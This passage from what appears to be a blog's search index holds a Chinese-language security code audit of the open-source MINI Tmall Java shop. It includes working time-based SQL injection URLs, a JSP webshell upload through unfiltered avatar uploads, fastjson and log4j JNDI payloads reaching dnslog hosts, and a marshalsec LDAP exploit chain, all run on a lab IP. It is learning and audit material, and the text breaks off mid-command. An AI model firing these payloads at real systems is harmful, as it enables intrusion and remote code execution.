src=\"7e1bdd42-9f5d-49fd-860d-1e241abc43d4.png\" alt=\"image\"></p>\n<p>5.在Exploit目录中开启http服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python37 -m http.server 8888</span><br></pre></td></tr></table></figure>\n<p>6.再打开一个shell创建一个ldap的服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -<span class=\"built_in\">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class=\"string\">&quot;http://127.0.0.1:8888/#Exploit&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"c88f04a3-152d-4da9-94e0-e773ec035a56.png\" alt=\"image\"></p>\n<p>7.再次运行项目</p>\n<p><img src=\"93cc5804-1b33-460c-8f29-7bd18044c38f.jpg\" alt=\"image\"></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","反序列化","RCE"]},{"title":"MINI天猫商城代码审计","url":"/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","content":"<h1 id=\"MINI天猫商城代码审计\"><a href=\"#MINI天猫商城代码审计\" class=\"headerlink\" title=\"MINI天猫商城代码审计\"></a>MINI天猫商城代码审计</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>最近看到很多师傅们，都在做这套tmall系统的代码审计，一时起兴趣，就自己也下载下来进行审一审，全程按照自己的思路去审计分析。在此进行简单的记录。</p>\n<h2 id=\"环境搭建与配置\"><a href=\"#环境搭建与配置\" class=\"headerlink\" title=\"环境搭建与配置\"></a>环境搭建与配置</h2><p>项目地址：<a href=\"https://gitee.com/project_team/Tmall_demo\">https://gitee.com/project_team/Tmall_demo</a></p>\n<p>配置文件：src&#x2F;main&#x2F;resources&#x2F;application.properties</p>\n<p>修改为自己的数据库地址，也可以修改启动的端口</p>\n<p><img src=\"A9LKEZadvuLcO8WshiS5_zZu2oQ5uFuwZsIsiBWKutQ.png\" alt=\"image\"></p>\n<p>启动文件：src&#x2F;main&#x2F;java&#x2F;com&#x2F;xq&#x2F;tmall&#x2F;TmallSpringBootApplication.java</p>\n<p>待maven加载完依赖之后，在该文件中进行启动项目。</p>\n<p><img src=\"S4qCXllB0lfY-EYB3VvMopRriHMWrvpgNwjnyxFt2mc.png\" alt=\"image\"></p>\n<p>浏览器访问</p>\n<p><img src=\"sGMZu6i0o4YbnEjwZ8WkzHfvhfnCdM1tu9erfY531HU.png\" alt=\"image\"></p>\n<p>当我进行一些功能的操作的时候，发现报错了。</p>\n<p><img src=\"bRwiZdkeSDU9jSMzbGy8q2itpZdBxABxpjripwgAKA0.png\"></p>\n<p>从下面这篇文章找到了解决方法，大概的意思就是我mysql版本较低，有个sql_mode默认没有开启，需要手动开启一下。</p>\n<p><a href=\"https://www.cnblogs.com/hungryquiter/p/16995127.html\">https://www.cnblogs.com/hungryquiter/p/16995127.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">SET @@global.sql_mode =<span class=\"string\">&#x27;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>上述配置是临时开启该模式，重mysql之后会消失。</p>\n<h2 id=\"审计硬编码和使用的供应链\"><a href=\"#审计硬编码和使用的供应链\" class=\"headerlink\" title=\"审计硬编码和使用的供应链\"></a>审计硬编码和使用的供应链</h2><h3 id=\"硬编码\"><a href=\"#硬编码\" class=\"headerlink\" title=\"硬编码\"></a>硬编码</h3><p>直接ctrl+shif+f 全局搜索password 、pass、jdbc等关键字。</p>\n<p>搜索password</p>\n<p><img src=\"dW055RlSMosFZVq3Bsle4y6ZgLBaFc76sWTt31hvpTo.png\" alt=\"image\"></p>\n<p>搜索jdbc</p>\n<p><img src=\"G0pAhAER4GW7XH0vPkzaFeSJI_ejyw3q2_n5f_LUFZk.png\" alt=\"image\"></p>\n<p>上述可看到一些硬编码</p>\n<h3 id=\"供应链安全\"><a href=\"#供应链安全\" class=\"headerlink\" title=\"供应链安全\"></a>供应链安全</h3><p>本项目是使用maven管理，所以直接查看pom.xml文件，分析用了那些依赖以及版本。再去判断是否存在漏洞。</p>\n<p><img src=\"JaLhHxRPGH2PkAW5npc8PT2CFajmXD_vOXIlKuX9oA4.png\" alt=\"image\"></p>\n<p>分析到了druid、fastjson、log4j、springframework.boot等一些比较常见的存在漏洞的组件或框架。</p>\n<p>先对其有大致的了解，后续再深入研究。</p>\n<h2 id=\"审计owaspTop10漏洞\"><a href=\"#审计owaspTop10漏洞\" class=\"headerlink\" title=\"审计owaspTop10漏洞\"></a>审计owaspTop10漏洞</h2><h3 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h3><h4 id=\"SQL注入一（后台）\"><a href=\"#SQL注入一（后台）\" class=\"headerlink\" title=\"SQL注入一（后台）\"></a>SQL注入一（后台）</h4><p>分析了一下该项目，发现mybatis的xml文件均存放在&#x2F;Users&#x2F;garck&#x2F;D&#x2F;code&#x2F;java&#x2F;CodeAudit&#x2F;Tmall_demo-master&#x2F;src&#x2F;main&#x2F;resources&#x2F;mybatis&#x2F;mapper中。</p>\n<p>下面直接搜索这个文件夹下面的带有 “$” 符号的xml文件来进行详细分析。</p>\n<p><img src=\"R5LFjOKJYSV8ZYNvgY1wBB_a6LHJZ6c2R6c3TlBlk0k.png\" alt=\"image\"></p>\n<p><img src=\"RCVvashWJlQe0ZBbzd4B2s9jZJJLnStqrCCiUbiIV7E.png\" alt=\"image\"></p>\n<p>SQL语句使用了“$” 符号，就是使用了拼接的方式进行执行。若能够控制传入的数据，且没有过滤的情况下，可构造payload进行SQL注入。</p>\n<p>下面开始分析 ProductMapper.xml的“${orderUtil.orderBy}”</p>\n<p><img src=\"g58fPkSb12qkbpG9ZTuazo7yl6doXP36ghUfyljL-Aw.png\" alt=\"image\"></p>\n<p>这是一个查询的SQL语句，并且绑定的是select方法，且是属于接⼝com.xq.tmall.dao.ProductMapper的select方法</p>\n<p><img src=\"faR5oAEY5Gu4y1nT1lH9i-JchVHFuBXXuaYyVNm_wNg.png\" alt=\"image\"></p>\n<p>查看该接口，确认存在select方法，且传入了OrderUtil参数</p>\n<p><img src=\"v5616V98pJYf5lR7b-YXr6JcdwNlf4ApqPEcvhYJBe8.png\" alt=\"image\"></p>\n<p>搜索哪个地方调用了这个接口的方法，发现接口实现类ProductServiceImpl中有调用</p>\n<p><img src=\"CJxsIYmAAtLCiNN58-KsMWlhFQYo3IqUOnBUB1HmDGg.png\" alt=\"image\"></p>\n<p>详情</p>\n<p><img src=\"rQ7D9Wcxk6KTbyuhV03hB8WEBYn-xiHUaH4VXWKD1ZE.png\" alt=\"image\"></p>\n<p>ProductService接口类声明的getList，同时传入的orderUtil</p>\n<p><img src=\"PL7q_4fg5FkMFSnz0LHEA8P10jchuNaB14b6ztmWZDM.png\" alt=\"image\"></p>\n<p>看一下orderUtil工具类</p>\n<p><img src=\"4p_n__dpbG5-Tm7F0E1TcTASSkO6PZKBlh1J-olguRM.png\" alt=\"image\"></p>\n<p>搜索哪个controller类中调用了ProductServiceImpl的getList方法，分析一下ForeProductListController168行</p>\n<p><img src=\"R2SbHwlsZsvVw9hhQD1DomChJ51ER_vTUORis7RK5VM.png\" alt=\"image\"></p>\n<p>看了一下这个注释，大概是在 获取商品列表的时候需要调用ProductService.getList。</p>\n<p>还原一下接口URL；确认是GET请求，根路径是product</p>\n<p><img src=\"L_yJC--fe4KS-0Z0R-Ch-vWP-WJQbIZk29h32GCqOXc.png\" alt=\"image\"></p>\n<p>产品高级查询功能；product&#x2F;{index}&#x2F;{count}，看到这里之后，凉凉了，orderUtil不可控。</p>\n<p><img src=\"K4bGIFH65ZSsmckU05MWP8pyWLBxZYAROhKtsDui5yY.png\" alt=\"image\"></p>\n<p>继续找其他调用ProductService.getList的controller类；看一下ProductController类的49行，发现传入的orderUtil为null，直接跳过分析下一个。</p>\n<p><img src=\"NVpD-Nmps9gm3dqPPBGNT-EHJzN7khr0mQ2mea3jrso.png\" alt=\"image\"></p>\n<p>ProductController类的405行，</p>\n<p><img src=\"8dSTKLl4xUWOBIxmVFrKBta2_M9J4d1cL_9qVEk74Z4.png\" alt=\"image\"></p>\n<p>结合OrderUtil的构造方法分析，看看有没有传入orderBy和isDesc这两个参数</p>\n<p><img src=\"_Mzz8zN1vCnyvwngr31N2h-BNbSrmavfTDLX6SrM4v8.png\" alt=\"image\"></p>\n<p>发现参数可控，前端传入orderBy参数到该控制层</p>\n<p><img src=\"13tqRPx3xqZQ83kZtkKTg8HwJbZuCoZ0ognokbRLfR0.png\" alt=\"image\"></p>\n<p>构造payload</p>\n<p>admin&#x2F;product&#x2F;{index}&#x2F;{count}，加上一个统一的前缀&#x2F;tmall后继续访问；&#x2F;tmall&#x2F;admin&#x2F;product&#x2F;</p>\n<p><img src=\"0QG6nM0OaDbiCoTGabMMDLDR5yZTemvwc39QKJw_my0.png\" alt=\"image\"></p>\n<p>登录后台。账号：admin.  密码：123456</p>\n<p>因为这里使用了rest风格的URL，理论上说index和count可以随意输入，所以直接构造到的URL为：<a href=\"http://192.168.75.154:8090/tmall/admin/product/1/1?orderBy=1\">http://192.168.75.154:8090/tmall/admin/product/1/1?orderBy=1</a></p>\n<p>注入参数：orderBy</p>\n<p><img src=\"yRIojR8Gm6UI9QON7BC6ZOsalU5du_SjjFsjTqekvmQ.png\" alt=\"image\"></p>\n<p>添加单引号</p>\n<p><img src=\"Nc-FAUCqKvTesqsgAKPDDccRwg-r31LOVF1JA97e260.png\" alt=\"image\"></p>\n<p>延迟5秒</p>\n<p><img src=\"0RPN1gIO7NsY1qs-Y_82bUvR7OLW9PeEhLgawGI_GqE.png\" alt=\"image\"></p>\n<p>sqlmap验证</p>\n<p><img src=\"H5GbOwzVOfd8htyOuM0quyHPGutc1U7XEXMla1pMh4Q.png\" alt=\"image\"></p>\n<p>看了一下过滤器，只做了权限校验。没有做SQL注入的过滤，所以只要发现参数可控的注入的即可注入，不需要绕过。</p>\n<p><img src=\"6QPlX1nJtLPMGa_rnxqVz10dQfyz9wlyxK3TcNhujQM.png\" alt=\"image\"></p>\n<h4 id=\"SQL注入二（前台）\"><a href=\"#SQL注入二（前台）\" class=\"headerlink\" title=\"SQL注入二（前台）\"></a>SQL注入二（前台）</h4><p>继续寻找调用了ProductServiceImpl的getList方法的controller</p>\n<p>ProductService.getList</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">----  ForeHomeController    ###调用ProductService.getList时传入为null，不存在注入</span><br><span class=\"line\">---+  ProductController     ###后台注入</span><br><span class=\"line\">---+  ForeProductListController   ###前台注入</span><br><span class=\"line\">----  ForeProductDetailsController   ###调用ProductService.getList时传入为null，不存在注入</span><br></pre></td></tr></table></figure>\n<p>ForeProductListController的168行传入了orderUtil对象。</p>\n<p><img src=\"1idGrN6XrKL7LK1kDGa1e8j9NGwt2bwwfbkfr500KFM.png\" alt=\"image\"></p>\n<p>分析orderUtil对象的来源。</p>\n<p><img src=\"l6vzVsRfFF5iXLSZGVP_TxXkOWn1tE1votXCQEIebIs.png\" alt=\"image\"></p>\n<p><img src=\"qpm6TF2VikRSreOzScimwNyJBBjwhx6dqqMfmwiJOkg.png\" alt=\"image\"></p>\n<p>进行构造payload</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">192.168.75.154:8090/tmall/product/0/20?orderBy=1 AND (SELECT 3188 FROM (SELECT(SLEEP(5)))KJQA)</span><br></pre></td></tr></table></figure>\n<p><img src=\"9Z0qgqtR-ynJluX--BI9mg6X_Xq3e8F023Hw3zVtdS4.png\" alt=\"image\"></p>\n<p>成功延迟</p>\n<p><img src=\"aZEjn49GvzMTUfxi6MaanU3wnUu1iI9P2fG6S-XtAko.png\" alt=\"image\"></p>\n<h4 id=\"SQL注入三（前台）\"><a href=\"#SQL注入三（前台）\" class=\"headerlink\" title=\"SQL注入三（前台）\"></a>SQL注入三（前台）</h4><p>分析到了利用链：ProductMapper.selectMoreList—ProductService.getMoreList—ForeProductListController(163)。</p>\n<p>需要满足条件：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">product_name_split不为空</span><br><span class=\"line\">product_name_split.length长度大于1</span><br></pre></td></tr></table></figure>\n<p><img src=\"b7sJTjIfFVd9cOZv38BpuIYAGEIhcENftkJ7TPbklE8.png\" alt=\"image\"></p>\n<p>溯product_name_split的由来</p>\n<p><img src=\"Pfdv1cTF2FZo2Ke7tId-E9i0c62MyJSvfNtVxpAMOhE.png\" alt=\"image\"></p>\n<p>product_name_split &#x3D; product_name.split(“ “);</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">product_name 不为空</span><br></pre></td></tr></table></figure>\n<p>分析得知：product_name_split 是通过空格去匹配来切割product_name传入的参数的值来分隔的</p>\n<p><strong>.split</strong>：可以根据匹配给定的正则表达式来拆分字符串</p>\n<p>所以传入的参数需要传入两个，并且使用空格分隔。最终得到的payload</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">/tmall/product/0/20?orderBy=%31%20%41%4e%44%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%28%73%65%6c%65%63%74%20%28%73%6c%65%65%70%28%35%29%29%29%6d%73%63%70%29&amp;isDesc=true&amp;category_id=2&amp;category_id=3&amp;product_name=%71%77%65%2c%61%73%64%20%7a%78%63</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">/tmall/product/0/20?orderBy=1 AND (select 1 from (select (sleep(5)))mscp)&amp;isDesc=true&amp;category_id=2&amp;category_id=3&amp;product_name=qwe,asd zxc</span><br></pre></td></tr></table></figure>\n<p><img src=\"S5Yz-EHBh8WNg554WYGuoUzqyYWGPaUN7DBpnf9Xqlc.png\" alt=\"image\"></p>\n<h4 id=\"SQL注入总结\"><a href=\"#SQL注入总结\" class=\"headerlink\" title=\"SQL注入总结\"></a>SQL注入总结</h4><p>本系统共审计发现6个SQL注入点且均已验证确认。下面是详细的污点传播链。</p>\n<ul>\n<li>SQL注入1：<br>RewardController(97)–&gt;RewardService.getList–&gt;RewardMapper.select –&gt;RewardMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入2：<br>  ForeProductListController(163)–&gt; ProductService.getMoreList–&gt;ProductMapper.selectMoreList–&gt;  ProductMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入3：<br>ProductController(405)–&gt;ProductService.getList–&gt; ProductMapper.select–&gt;  ProductMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入4：<br>ForeProductListController(168)–&gt;ProductService.getList–&gt; ProductMapper.select–&gt;ProductMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入5：<br>OrderController(176)–&gt;ProductOrderService.getList–&gt;ProductOrderMapper.select–&gt;ProductOrderService.xml(${orderUtil.orderBy})</li>\n<li>SQL注入6：<br>UserController(170)–&gt; UserService.getList–&gt;UserMapper.select–&gt;UserMapper.xml(${orderUtil.orderBy})</li>\n</ul>\n<p><img src=\"34NeD_tT0kwQbDrFJRE_QOjITFE0pW5d9lUxJk46GdY.png\" alt=\"image\"></p>\n<h3 id=\"XSS-反射\"><a href=\"#XSS-反射\" class=\"headerlink\" title=\"XSS(反射)\"></a>XSS(反射)</h3><ul>\n<li>requestScope：是EL表达式中的一个隐含对象，类似request，如：${requestScope.username} 表示在request域中取得username属性所对应的值</li>\n</ul>\n<p>搜索requestScope、map.put。</p>\n<p>触发链：ForeProductListController拿到了product_name后赋值给searchValue，未做处理之后直接map.put传到了request域，转到fore&#x2F;productListPage。</p>\n<p>链为：前端传参–&gt;ForeProductListController–&gt;获取参数–&gt;传到前端–&gt;展示（触发）</p>\n<p><img src=\"l2l6pMOC1jtn27Xp40uLZxt78j7BHP2Np46Kt31_6bA.png\" alt=\"image\"></p>\n<p>productListPage页面直接调用</p>\n<p><img src=\"XKRQ5fGyAcQ6Oyn6prR1mFeqgc7rg_efCoqkIpoAtVk.png\" alt=\"image\"></p>\n<p>验证</p>\n<p><img src=\"2h3pLjkdR6tzagmMau4Pkb9iIpI1gv7-dHFXlpnKN4s.png\" alt=\"image\"></p>\n<p><img src=\"RIWBAYLT2bE54OXw3PovYEUck53NunG-qcPDtzo6nAU.png\" alt=\"image\"></p>\n<h3 id=\"XSS（存储）\"><a href=\"#XSS（存储）\" class=\"headerlink\" title=\"XSS（存储）\"></a>XSS（存储）</h3><p>注册账号</p>\n<p>控制层拿到传入的user_name</p>\n<p><img src=\"NKIT6LiKZqM12dhte7k7ROSZXik3QcKOPqqlS4pl-z4.png\" alt=\"image\"></p>\n<p>创建用户对象，然后将用户对象传入到service层</p>\n<p><img src=\"oa6gt_8VHLNP-34_WdjujK0C2k9aoggYOy4U30bbUQU.png\" alt=\"image\"></p>\n<p>service调用dao层的接口</p>\n<p><img src=\"GOusN-7mvd-I0Ieeq2K72oFuq4IQdFLjrBhowtCD8Wo.png\" alt=\"image\"></p>\n<p><img src=\"ZA_N5lFepeyPq3aMnxLlfnB9ME77u-zBs9lJ9MhR1_c.png\" alt=\"image\"></p>\n<p>最终到了xml配置文件，执行SQL语句的地方，成功插入数据。</p>\n<p><img src=\"7xInJKQWGyGNz4JZenh61qxTRa2wAJZcfHpzHO2j_M0.png\" alt=\"image\"></p>\n<p>burp验证。</p>\n<p><img src=\"Zpu9O9AW14VXKYEx7BzYkQDW5-xwY3PYBZyDk4wYp5s.png\" alt=\"image\"></p>\n<p>看了下数据表，只要名字的长度不超过25就不会报错，不然报服务器500的错误。</p>\n<p><img src=\"Uih_0Rrw4zcFt1tR6nHq-cNJ5EnpoV7lvz3rwcs2R8Q.png\" alt=\"image\"></p>\n<p>登录账号之后触发。有一个页面是去获取数据库中存储的用户名的。所以登录之后直接出发XSS。</p>\n<p><img src=\"URvs16uQc_xgZ63ndFX3e_dWHCTLUd6Ako53blYkBJw.png\" alt=\"image\"></p>\n<p>触发链：</p>\n<p>访问tmall&#x2F;login，即可访问到ForeLoginController控制层的login，重定向到 fore&#x2F;loginPage</p>\n<p><img src=\"b4ufrbzQy2x1NNy3RjihfaBjnrIq7nFLYyWvq-bMoaQ.png\" alt=\"image\"></p>\n<p>登录页面的loginPage.jsp</p>\n<p><img src=\"Zoz2dHy4yuIJqg7zDzSdPSa282T6zWwUpYWbK8d6nqI.png\" alt=\"image\"></p>\n<p>调用了fore_login.js；如果后端响应返回成功，则访问&#x2F;tmall</p>\n<p><img src=\"7xY6hv2tiXTz0c0gGRYRa_W9rQZNGeecvgduRWflQU0.png\" alt=\"image\"></p>\n<p>登录成功返回</p>\n<p><img src=\"1rLYOoBiy_GcuM6mYL5R-Il8_O-bLqZDmTQJ8DakTPE.png\" alt=\"image\"></p>\n<p>主页，取出前面登录成功存进去的userId，判断用户是否登录。如果已经登录则把整改user对象传到Request。map.put(“user”, user)；其中user对象的数据会调用service层的userService.get，service会调用dao的userMapper.selectOne，selectOne去数据库根据这个userId查询信息。返回后封装成User对象。</p>\n<p><img src=\"0HfOGkNMdZwCSNwAIPyYOkjrtm4I-V9v9_Qh1X59M9A.png\" alt=\"image\"></p>\n<p>执行完上面的之后，跳转到fore&#x2F;homePage；homePage里面又包含了navigator.jsp</p>\n<p><img src=\"_16A5IdHxBc5eMux8NY-ORAkXOKUFKpPN0kulPfqTF0.png\" alt=\"image\"></p>\n<p>navigator.jsp触发</p>\n<p><img src=\"3TSQXgEcJ9Y56MH6f9rwmdLFzuBqf9_n_OLr_vL0gFo.png\" alt=\"image\"></p>\n<h3 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h3><h4 id=\"文件上传1\"><a href=\"#文件上传1\" class=\"headerlink\" title=\"文件上传1\"></a>文件上传1</h4><p>全局搜索upload</p>\n<p><img src=\"5jCZfY_15FLJfaHu_nYLsj3Fs4II2jM7wEaQdG7F1uc.png\" alt=\"image\"></p>\n<p>发现头像上传的controller，且不存在过滤。</p>\n<p>通过post上传文件，调用UUID随机数重命名文件之后直接保存到了res&#x2F;images&#x2F;item&#x2F;userProfilePicture&#x2F;目录，上传成功之后JSON格式返回状态以及文件名称。</p>\n<p>未对所上传的文件进行类型已经文件后缀校验，存在任意文件上传漏洞。</p>\n<p><img src=\"FEO_t3JVm1MSKbCCnAEVqHkXug_dZSXRM19zKwq4p2Q.png\" alt=\"image\"></p>\n<p>前台用户头像更换处</p>\n<p><img src=\"gtuL_Fd7R3Y9UBVUQfUQ95qZ8Mxwop9L8wsna-vRXFw.png\" alt=\"image\"></p>\n<p>使用蚁剑生成一个jsp的webshell，直接粘贴到bp进行上传。</p>\n<p><img src=\"zyqZl6Hpyqp_kKx0ucpJOI0vMhl3DY3Afjm-UQYdnwU.png\" alt=\"image\"></p>\n<p>连接URL：<a href=\"http://192.168.75.154:8090/tmall/res/images/item/userProfilePicture/e1dd8f9e-25bb-4d14-be97-0f378c49cdf9.jsp\">http://192.168.75.154:8090/tmall/res/images/item/userProfilePicture/e1dd8f9e-25bb-4d14-be97-0f378c49cdf9.jsp</a></p>\n<p>因为有个统一的前缀&#x2F;tmall，所以这个别忘记加上。</p>\n<p><img src=\"yVEiAhYiisiCH01WYjOZrZ2E1s-nrtg5PF5OE-TB5cU.png\" alt=\"image\"></p>\n<p><img src=\"7_XtDcER1-ZWdDXck5QA6j8INlOkYqetQ1HyoaY0m0E.png\" alt=\"image\"></p>\n<p>本项目存在4个文件上传点，且都可以进行getshell</p>\n<h4 id=\"文件上传2\"><a href=\"#文件上传2\" class=\"headerlink\" title=\"文件上传2\"></a>文件上传2</h4><p><img src=\"xZXCYI_skzpX3QvocLJBXgFYyF3hRuQbH98Y9jn5V0Y.png\" alt=\"image\"></p>\n<p><img src=\"4ZofkFAmvbWezVylXq4xRNNmv_Y22Vxb-u86IPZj2tQ.png\" alt=\"image\"></p>\n<p><img src=\"ZS3wfYz4GyRSD9nyWHgc-yOm4LpK4UFIHXEgLWfL5-U.png\" alt=\"image\"></p>\n<p><img src=\"rkTgEsjpNY2ExjI9SODeeVdhLa8F0p3dMRVvL8wfXjc.png\" alt=\"image\"></p>\n<h4 id=\"文件上传3\"><a href=\"#文件上传3\" class=\"headerlink\" title=\"文件上传3\"></a>文件上传3</h4><p>管理员头像上传</p>\n<p><img src=\"AQOXXqxaeV20vD5v1eEZpqRfTeityFJpqsV_H0uJS3U.png\" alt=\"image\"></p>\n<h4 id=\"文件上传4\"><a href=\"#文件上传4\" class=\"headerlink\" title=\"文件上传4\"></a>文件上传4</h4><p>添加产品处</p>\n<p><img src=\"g9BcswcLx3jFva0uCDLFfA1xwyuIRtd6fYdJhiwKAdk.png\" alt=\"image\"></p>\n<p><img src=\"_1a6Wed9yFY01DSimi-fbRq6NJQAQibnsuldmak_7oM.png\" alt=\"image\"></p>\n<h3 id=\"CSRF\"><a href=\"#CSRF\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h3><p>因项目没有其他过滤器校验Referer头，所以全局存在CSRF漏洞。</p>\n<p><img src=\"fyPyjMeHGyB3foieSIReNHa1W9KCNJXxT-daiXnhVjM.png\" alt=\"image\"></p>\n<p>验证</p>\n<p><img src=\"eXXiTbZ9W-O0Wh2kDRWgePYpPdhMgTU8FyJTi-SoAOE.png\" alt=\"image\"></p>\n<p><img src=\"EBdNXwilm1WtChdps91ukf0QHViF8COp_7BXj7bTpwY.png\" alt=\"image\"></p>\n<h3 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h3><p>搜索全局未发现可能引起SSRF的危险函数。</p>\n<h2 id=\"框架漏洞\"><a href=\"#框架漏洞\" class=\"headerlink\" title=\"框架漏洞\"></a>框架漏洞</h2><h3 id=\"fastjson\"><a href=\"#fastjson\" class=\"headerlink\" title=\"fastjson\"></a>fastjson</h3><p>拿到源码的时候，fastjson使用的是1.2.83版本；这个版本目前暂时安全。为了好玩一点，我们可以把版本降低一点来进行fastjson的反序列化攻击测试，我这里就直接改为了1.2.24。（当然这不算属于这个源码本身的漏洞，只是学习把版本降低进行测试。）</p>\n<p>搜索关键字JSON.parseObject（Json字符串转化为相应的对象）</p>\n<p><img src=\"suZ-Aty_CIAkbjBfk-Pj7-Ao2efd0RltOmKtrS98bkU.png\" alt=\"image\"></p>\n<p>更新产品属性的地方进行了JSON.parseObject（添加产品属性的地方也进行了JSON.parseObject）,没进行过滤，从前端获取到数据，直接传给JSON.parseObject。</p>\n<p><img src=\"uBjFPdMakVMEl9o-pAJ2ULEXEAdjCOkhASHx0FgChZ4.png\" alt=\"image\"></p>\n<p><img src=\"jZqZfxwvhLu7UKS8txMiIGs3MrBdqaXPDPQc-VPAOFE.png\" alt=\"image\"></p>\n<p><img src=\"yw8P6P4QKiSBqlSx-MN6j2i7lNxA9iNjZvbiZ3QKudY.png\" alt=\"image\"></p>\n<p>进行dnslog探测</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;garck3h&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;java.net.Inet4Address&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;val&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;666.eyle20.dnslog.cn&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"bYxVeXTjTX5cbZCkonJGRrfsx0aaAkTDcOvCTH7q3W4.png\" alt=\"image\"></p>\n<p><img src=\"dh6UpVpgr4kuOPU_LT9OgRDSZuV-cd8KSnaAZdjn8TU.png\" alt=\"image\"></p>\n<p>使用BCEL进行本地序列化成功弹计算器。</p>\n<p><img src=\"f8WcV8-fjogKnEk4fjhBaV3kpGhxfPYQeSo8-o1j2Mc.png\" alt=\"image\"></p>\n<p>使用Spring做回显，成功执行命令并且回显</p>\n<p><img src=\"CWCpnsfSkPTl3QqcCuOSNNnGg52aciyLi9y5UZVvGN0.png\" alt=\"image\"></p>\n<p>此外该系统还有其他功能点存在该漏洞</p>\n<h3 id=\"log4j2\"><a href=\"#log4j2\" class=\"headerlink\" title=\"log4j2\"></a>log4j2</h3><p>这里的log4j是2.20版本，属于安全版本。我改一下为2.14版本。测试一下log4j漏洞。</p>\n<p><img src=\"lAcfIK-Ol9vPNWWft8Y6JMJclVva5BZ7aGbYpNIF1p0.png\" alt=\"image\"></p>\n<p>全局搜索：logger.info；发现一个orderBy是可控的</p>\n<p><img src=\"M15QiIJCXqhwFSx95jCZ2-MAEybA7RHhxOs6lgXOW9E.png\" alt=\"image\"></p>\n<p><img src=\"Mo_LiEFaWsRyArUngTNoln12ZkF7YFHYEC6MqQnULn8.png\" alt=\"image\"></p>\n<p>使用dnslog进行探测，成功接收到请求。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">$<span class=\"punctuation\">&#123;</span>jndi<span class=\"punctuation\">:</span>ldap<span class=\"punctuation\">:</span><span class=\"comment\">//log4j.15k855.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"oMwirlis5rJehQMpkWYkxgGXtL1DQ3xt7a5VYckIJ_Q.png\" alt=\"image\"></p>\n<p><img src=\"p4H9naK8RBGr9E6NMItnUf3tviG3yQma81LE7Ba4zuw.png\" alt=\"image\"></p>\n<p>进行JNDI注入：</p>\n<p>写好的弹计算器的payload，然后使用Javac TestCmd.java进行编译</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestCmd</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">       <span class=\"type\">TestCmd</span> <span class=\"variable\">qwe</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TestCmd</span>();</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用marshalsec-0.0.3-SNAPSHOT-all.jar起ldap服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -<span class=\"built_in\">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span 